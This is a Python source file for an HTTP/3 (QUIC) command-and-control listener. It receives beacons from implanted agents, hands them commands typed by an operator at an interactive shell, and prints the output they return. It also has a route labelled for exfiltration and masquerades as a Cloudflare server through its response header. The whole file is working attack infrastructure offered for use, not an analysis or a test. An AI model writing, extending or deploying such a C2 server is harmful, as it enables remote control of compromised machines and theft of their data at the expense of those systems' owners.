import argparse
import asyncio
import json
import logging
import sys
from typing import Dict, Optional

from aioquic.asyncio import serve
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.quic.configuration import QuicConfiguration
from aioquic.h3.connection import H3Connection
from aioquic.h3.events import HeadersReceived, DataReceived, H3Event

# Suppress default noisy logging so CLI prompt remains clean


# Global queue to hold command string entered via quic_demo> shell
PENDING_COMMAND: Optional[str] = None


class C2ServerProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.http = H3Connection(self._quic)
        self.stream_headers: Dict[int, dict] = {}
        self.stream_data: Dict[int, bytearray] = {}

    def quic_event_received(self, event):
        for http_event in self.http.handle_event(event):
            self.handle_h3_event(http_event)

    def handle_h3_event(self, event: H3Event):
        if isinstance(event, HeadersReceived):
            headers = {k.decode("utf-8"): v.decode("utf-8") for k, v in event.headers}
            self.stream_headers[event.stream_id] = headers
            self.stream_data[event.stream_id] = bytearray()

        elif isinstance(event, DataReceived):
            if event.stream_id in self.stream_data:
                self.stream_data[event.stream_id].extend(event.data)

            if event.stream_ended:
                self.process_request(event.stream_id)

    def process_request(self, stream_id: int):
        global PENDING_COMMAND
        headers = self.stream_headers.pop(stream_id, {})
        body = bytes(self.stream_data.pop(stream_id, bytearray()))
        
        path = headers.get(":path", "/")
        
        # Route 1: Telemetry / Beacon Endpoint
        if path == "/api/v1/telemetry":
            try:
                payload = json.loads(body.decode("utf-8"))
                agent_id = payload.get("agent_id", "unknown")
                
                # Check if agent sent back command output
                if "output" in payload:
                    print(f"\n[+] Output from Agent ({agent_id}):\n{payload['output']}")
                    sys.stdout.write("quic_demo> ")
                    sys.stdout.flush()

            except json.JSONDecodeError:
                pass

            # Prepare response: attach command if queued in CLI shell
            task_cmd = None
            if PENDING_COMMAND:
                task_cmd = PENDING_COMMAND
                PENDING_COMMAND = None  # Clear queue after staging
                print(f"\n[*] Dispatching task to Stream {stream_id}: '{task_cmd}'")
                sys.stdout.write("quic_demo> ")
                sys.stdout.flush()

            response_payload = json.dumps({
                "status": "acknowledged",
                "task": task_cmd
            }).encode()

            self._send_h3_response(stream_id, status=200, payload=response_payload, content_type="application/json")

        # Route 2: Exfiltration Endpoint
        elif path == "/api/v1/upload":
            
            sys.stdout.write("quic_demo> ")
            sys.stdout.flush()

            response_payload = json.dumps({"status": "received"}).encode()
            self._send_h3_response(stream_id, status=200, payload=response_payload, content_type="application/json")

        else:
            self._send_h3_response(stream_id, status=404, payload=b"Not Found", content_type="text/plain")

    def _send_h3_response(self, stream_id: int, status: int, payload: bytes, content_type: str):
        response_headers = [
            (b":status", str(status).encode()),
            (b"content-type", content_type.encode()),
            (b"server", b"cloudflare"),
            (b"content-length", str(len(payload)).encode()),
        ]

        self.http.send_headers(stream_id=stream_id, headers=response_headers)
        self.http.send_data(stream_id=stream_id, data=payload, end_stream=True)
        self.transmit()


async def cli_shell():
    """Asynchronous interactive CLI shell for staging commands."""
    global PENDING_COMMAND
    loop = asyncio.get_event_loop()
    
    await asyncio.sleep(0.5)  # Brief pause to let server startup output settle
    
    while True:
        # Run input() in executor to prevent blocking the asyncio loop
        cmd = await loop.run_in_executor(None, input, "quic_demo> ")
        cmd = cmd.strip()
        
        if not cmd:
            continue
            
        if cmd.lower() in ["exit", "quit"]:
            print("[*] Shutting down server...")
            sys.exit(0)
            
        PENDING_COMMAND = cmd
        print(f"[*] Queued command: '{cmd}' (Will be sent on next agent beacon)")


def main():
    parser = argparse.ArgumentParser(description="HTTP/3 C2 Listener Engine")
    parser.add_argument("-d", "--domain", default="0.0.0.0", help="Binding host or domain IP (default: 0.0.0.0)")
    parser.add_argument("-p", "--port", type=int, default=443, help="UDP binding port (default: 443)")
    parser.add_argument("--cert", required=True, help="Path to TLS Certificate (cert.pem)")
    parser.add_argument("--key", required=True, help="Path to TLS Private Key (key.pem)")

    args = parser.parse_args()

    config = QuicConfiguration(
        is_client=False,
        alpn_protocols=["h3"],
    )
    config.load_cert_chain(certfile=args.cert, keyfile=args.key)

    loop = asyncio.get_event_loop()
    
    print(f"[*] Starting HTTP/3 C2 Listener on UDP {args.domain}:{args.port}...")
    
    # Start QUIC Server task
    server_coro = serve(
        args.domain,
        args.port,
        configuration=config,
        create_protocol=C2ServerProtocol
    )
    
    loop.run_until_complete(server_coro)
    
    # Run CLI interactive prompt concurrent with server
    try:
        loop.run_until_complete(cli_shell())
    except KeyboardInterrupt:
        print("\n[*] Exiting...")


if __name__ == "__main__":
    main()
